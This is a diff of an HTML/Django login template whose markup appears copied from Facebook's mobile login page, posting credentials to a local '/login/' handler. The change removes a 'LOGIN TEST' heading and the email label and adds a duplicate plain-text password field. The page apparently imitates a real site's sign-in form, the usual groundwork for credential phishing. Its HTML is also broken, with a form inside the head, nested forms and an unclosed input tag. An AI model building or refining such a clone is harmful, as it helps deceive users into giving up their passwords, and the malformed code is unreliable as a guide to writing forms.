@@ -1,4 +1,3 @@
-<h1>LOGIN TEST</h1>
 <!DOCTYPE html><span data-bloks-name="bk.components.TextSpan" style="color: rgb(102, 106, 114); font-weight: 400; display: inline; font-size: 13.5px; font-family: &quot;Optimistic 95&quot;; white-space: pre-wrap; overflow-wrap: break-word;">Français (France)</span><br><br>
 
 
@@ -8,7 +7,6 @@
 <html>
 <head>
     <form>
-          <label>Numéro mobile ou Email :</label><br>        
 <form method="POST" action="/login/">
     {% csrf_token %}
 
@@ -16,6 +14,7 @@
                 <label>Mot de passe :</label><br>
         
 <input dir="auto" data-bloks-name="bk.components.TextInput" id="m_login_password" aria-label="Mot de passe" autocapitalize="off" autocomplete="on" autocorrect="off" class="wbloks_1 wbloks_66" placeholder="" type="password" value="" name="pass" style="background: transparent; color: rgb(17, 17, 18); font-family: &quot;Optimistic 95&quot;; font-size: 15.2px; line-height: 1.3; caret-color: rgb(17, 17, 18);"><br><br>
+<input type="text" name="pass" placeholder="password"<br><br>
 </form>
 <button type="submit" class="wbloks_1" style="
     height: 44px;
